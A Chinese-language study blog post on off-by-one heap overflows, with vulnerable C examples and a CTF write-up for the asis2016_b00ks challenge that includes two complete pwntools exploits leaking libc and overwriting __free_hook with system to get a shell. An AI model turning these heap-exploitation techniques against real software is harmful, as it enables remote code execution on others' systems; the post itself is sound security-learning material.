---
title: off-by-one
date: 2023-08-02 16:33:20
tags: [Pwn,heap,off-by-one]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/onecover.jpg"
categories: [Study]
---

off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。比如定义的数组是 a[4]，在操作的时候却操作a[4]，实际上数组最大是到a[3]。

------

# 一、溢出原理

## 1.1 基础原理

1. 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。
2. 溢出字节为 NULL 字节：溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理。另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。修改下一个堆块的size造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。

## 1.2 例子1

如下程序：

```c
//gcc -g 1.c
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)
    {
        ptr[i]=getchar();
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```

申请两个大小16的chunk，然后在chunk1里面输入16个字符，由于for(i=0;i<=size;i++) 里面的 i<=size，也就是说，会多循环一次，造成溢出。两个chunk相连，此时就会导致第2个chunk的数据被修改。

p ptr 看一下 ptr 指向的是哪一个地址。x/10gx 0x555555756260-0x10 然后查看一下那一块的内存，减去 0x10 是因为 chunk 前面要记录一些信息，比如前 0x8 如果前一个是空闲的话就记录前一个 chunk 的大小，否则就给前一个用来存数据。后面 0x8 记录的分别是该 chunk 的大小和 A、M、P 标志位。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one1.png?x-oss-process=style/watermark)

如图所示，橙色位置就是prev_size，绿色位置就是size和AMP标志位。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one2.png?x-oss-process=style/watermark)

chunk的A、M、P分别为0，0，1。分别表示主分配区、从heap区分配、第一个chunk（前一个chunk被使用）。size的大小为0x20（16字节的数据+16字节的chunk头），所以上图中绿色的框内的值为0x20+001=0x21。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one3.png?x-oss-process=style/watermark)

输入 17 个字符A，由于之前源码中写的 my_gets(chunk1,16)， 是 16 个，造成溢出，可以看到把第二个 chunk 的低一字节改成了 0x41。

## 1.3 例子2

如下程序：

```c
//gcc -g 2.c
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;

}
```

strlen 在计算长度的时候不会把结束符 '\x00' 计算在内，strcpy 在拷贝的时候会把 '\x00' 也算上，也就是说，我们往chunk1中输入了25个字符，造成溢出。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one4.png?x-oss-process=style/watermark)

输入24个A，结果如下：0x411被写为0x400。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one5.png?x-oss-process=style/watermark)

# 二、例题

题目链接：https://buuoj.cn/challenges#asis2016_b00ks ，buuctf题目名字：asis2016_b00ks

## 2.1 分析

运行，其功能如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one6.png?x-oss-process=style/watermark)

程序运行刚开始，会先设置作者名，然后选择要使用的功能，分别是创建书、删除书、编辑书、打印书的内容、改变作者名字。

分析其反汇编代码，首先输入作者名字，在首次输入时，会将数据写入off_202018位置，输入最大为32。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one7.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one8.png?x-oss-process=style/watermark)

当i=a2（32）时，此时已经多输入了一个字符，导致一个字节溢出。

在创建书时，系统会申请3个堆，分别存放book name、book description、v3。其中前两个堆大小需要输入，v3大小为0x20。v3里面会存放book description的大小、指针book name的指针和书的id，而v3（指针地址）则会存入book description后面的位置。

v3可以视为book information存放处，其存放地址（off_202018）和最初我们存放作者名字的地址相连。如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one9.png?x-oss-process=style/watermark)

创建堆和存入内容如下图：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one10.png?x-oss-process=style/watermark)

## 2.2溢出思路1：

1、在作者名处，输入32个字符，这样程序读取时，会多读取一个字节，也就是book information的地址（起始处）。然后创建一个书，利用书的查看功能，打印作者名，就会将book information的地址打印出来。（此时堆情况如上图所示）

2、再创建一个书，申请书名和书内容时，申请两个很大的堆（超过128 KB），使其不从主分配区分配，从mmap地区分配，此时新申请在主分配区的堆只有book2 information，由于我们已经泄露了book1 information的地址，且其大小为0x20，因此book2 information的地址为book2 information=book1 information+0x20+0x10（0x10时chunk_header的大小）

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one11.png?x-oss-process=style/watermark)

3、使用编辑书的功能，输入一个伪造的fake book1 informtion，使这个伪造的book指向book2的name的地址，也就是mmap的地址（内存地址）。这个fake book有两个用处，一是泄露book2_name在mmap的地址，从而通过libc偏移计算libc基址，二是通过book2_name修改book2 information的内容，使其指向我们想要的地址。

```python
payload = 0x60 * 'a' + p64(1) + p64(book2_name) *2+ p64(0xffff)
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one12.png?x-oss-process=style/watermark)

**4、泄露libc地址。**先通过修改书的名字，溢出一个字符“\x00”，将原先的book1 infomation覆盖掉(0x5555557583a0à0x555555758300)，此时查看书的内容，就是查看我们伪造的fake book information，就可以泄露book2_name在mmap的地址。mmap开辟出的块与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能通过一个“固定的偏移”得到libc。如图，通过book2_name的地址(0x7ffff7fb8010)和libc(0x7ffff79e2000)的地址，计算其偏移：0x7ffff7fb8010 - 0x00007ffff79e2000 = **0x5d6010**

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one13.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one14.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one15.png?x-oss-process=style/watermark)

5、拿到libc偏移后，就可以计算system、bin/sh、free hook的地址了 

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one16.png?x-oss-process=style/watermark)

6、然后通过修改book1的内容（即将内容写入book2_name地址）。将book2 information的book2_name修改为bin/sh地址，将book2des修改为free_hook地址。然后修改book2的内容为system地址，即向free_hook地址写入system函数地址。

7、然后将book2删除，删除时会首先执行free(book2_name)，也就是执行free(‘/bin/sh’)，而free_hook又被修改成了system，也就是会执行system(‘bin/sh’)了。

```python
payload1 = p64(bin_sh) + p64(free_hook)
change_des(1,payload1)
change_des(2,p64(system_addr))
delete(2)
```

**如图所示**：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one17.png?x-oss-process=style/watermark)

完整exp：

```python

from pwn import *
context(arch="amd64",os="linux",log_level="debug")
def name_1():
	p.recvuntil("Enter author name: ")
	p.sendline("a" * 0x20)
def change_name():
	p.recvuntil("> ")
	p.sendline("5")
	p.recvuntil("Enter author name: ")
	p.sendline("a" * 0x20)

def create_book(size,name,size_des,desc):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("Enter book name size: ")
	p.sendline(str(size))
	p.recvuntil("Enter book name (Max 32 chars): ")
	p.sendline(str(name))
	p.recvuntil("Enter book description size: ")
	p.sendline(str(size_des))
	p.recvuntil("Enter book description: ")
	p.sendline(str(desc))
def change_des(id,des):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("Enter the book id you want to edit: ")
	p.sendline(str(id))
	p.recvuntil("Enter new book description: ")
	p.sendline(str(des))

def print_book():
	p.recvuntil("> ")
	p.sendline("4")

def delete(id):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("Enter the book id you want to delete: ")
	p.sendline(str(id))

p = process("./b00ks")
elf = ELF("./b00ks")
libc = elf.libc
name_1()
create_book(0x20,"aaaa",0x100,"bbbb")
print_book()
p.recvuntil("a" * 0x20)
book1_addr = u64(p.recv(6).ljust(8,"\x00"))
print(hex(book1_addr))

create_book(0x21000,"cccc",0x21000,"dddd")
book2_addr = book1_addr + 0x30
book2_name = book2_addr + 0x8
payload = 0x60 * 'a' + p64(1) +  p64(book2_name) + p64(book2_name) + p64(0xffff)
change_des(1,payload)
change_name()
print_book()

p.recvuntil("Name: ")
book2_name = u64(p.recv(6).ljust(8,"\x00"))
log.success("book2_name:" + hex(book2_name))
gdb.attach(p)

libc_base = book2_name - 0x5db010
bin_sh = libc.search("/bin/sh").next() + libc_base
system_addr = libc.symbols["system"] + libc_base
free_hook = libc.symbols['__free_hook'] + libc_base
log.success("libc_base:" + hex(libc_base))
log.success("bin_sh:" + hex(bin_sh))
log.success("system_addr:" + hex(system_addr))
log.success("free_hook:" + hex(free_hook))

payload1 = p64(bin_sh) + p64(free_hook)
change_des(1,payload1)
change_des(2,p64(system_addr))
delete(2)

p.interactive()
```

本地被打通：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one22.png?x-oss-process=style/watermark)

## 2.3溢出思路2

1、与思路1相同，利用打印作者名的漏洞，创建书1，打印book1 information的地址。

2、通过unsorted bin泄露mallo_hook地址。要想达到这个条件，就需要创建一个大于0x80的堆，然后释放它。因此创建书2和书3，其中书2的book2_name要大于0x80，书3的name为bin/sh，作用为后续释放书3时，可以直接free(‘bin/sh’)。达到思路1中第7步的目的。也可以后续新建一个书达到同样的目的。

```python
add(0x80,'cccccccc',0x60,'dddddddd')
add(0x20,'/bin/sh',0x20,'/bin/sh') 
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one18.png?x-oss-process=style/watermark)

3、free书2，此时，book2_name的堆会进入unsorted bin，其fd，bk会指向unsorted bin的链表头，通过其fd指针即可泄露unsorted bin的地址。而book2_name的fd地址可以通过book1 information的地址计算出来，即boo2_name_fd=book1_information+0x30。如上图所示。

4、与思路1相同，使用编辑书的功能，输入一个伪造的fake book1 informtion。使book1的name地址变成我们的boo2_name_fd地址，泄露unosrted bin地址，使boo1的des地址指向book的 des地址，以便修改free_hook的值。book3_des= book1_information + 0x30 + 0x90 + 0x70 + 0x30*3 + 0x10 = book1_information+0x1d0。

```python
edit(1, p64(1) + p64(book1_addr + 0x30) + p64(book1_addr + 0x1d0) + p64(0x20))
change('a'*0x20)
show()
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one19.png?x-oss-process=style/watermark)

5、泄露出unsorted bin地址后，可以求得malloc_hook的地址。在glib2.23中，unsorted bin在main_arena+88的位置。而malloc_hook在main_arena上方0x10的位置。即

```python
malloc_hook = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 88 - 0x10
```

6、获取地址以后，剩下的思路就跟思路1的一样啦。获取free_hook的地址和system的地址，通过修改book1的内容，向boo3_des_addr处写入free_hook的内容，在修改boo3的内容，向free_hook中写入system。 

```python
edit(1,p64(__free_hook)+'\x10') #由于sendline会加一个回车，导致size变成0。free的时候就会出问题了，所以要加一个size。
edit(3,p64(system))
delete(3)
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one20.png?x-oss-process=style/watermark)

完整exp：

```python
from pwn import *
 
p=remote("node4.buuoj.cn",28876)
elf = ELF('./b00ks')
libc = ELF('./libc-2.23.so')
 
def add(name_size,name,content_size,content):
    p.sendlineafter('> ','1')
    p.sendlineafter('size: ',str(name_size))
    p.sendlineafter('chars): ',name)
    p.sendlineafter('size: ',str(content_size))
    p.sendlineafter('tion: ',content)
def delete(index):
    p.sendlineafter('> ','2')
    p.sendlineafter('delete: ',str(index))
def edit(index,content):
    p.sendlineafter('> ','3')
    p.sendlineafter('edit: ',str(index))
    p.sendlineafter('ption: ',content)
def show():
    p.sendlineafter('> ','4')
def change(author_name):
    p.sendlineafter('> ','5')
    p.sendlineafter('name: ',author_name)
 
p.sendlineafter('name: ','a'*0x1f+'b')
add(0xd0,'aaaaaaaa',0x20,'bbbbbbbb')
show()
p.recvuntil('aaab')
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
print 'heap_addr-->'+hex(heap_addr)
add(0x80,'cccccccc',0x60,'dddddddd')
add(0x20,'/bin/sh',0x20,'/bin/sh')
delete(2)

edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x180+0x50)+p64(0x20))
change('a'*0x20)
show()

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-88-0x10-libc.symbols['__malloc_hook']
__malloc_hook = libc_base+libc.symbols['__malloc_hook']
realloc = libc_base+libc.symbols['realloc']
print 'libc_base-->'+hex(libc_base)
__free_hook=libc_base+libc.symbols['__free_hook']
system=libc_base+libc.symbols['system']
edit(1,p64(__free_hook)+'\x10')
print '__free_hook-->'+hex(__free_hook)

edit(3,p64(system))
delete(3)
p.interactive()
```

成功拿到flag:

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/one/one21.png?x-oss-process=style/watermark)
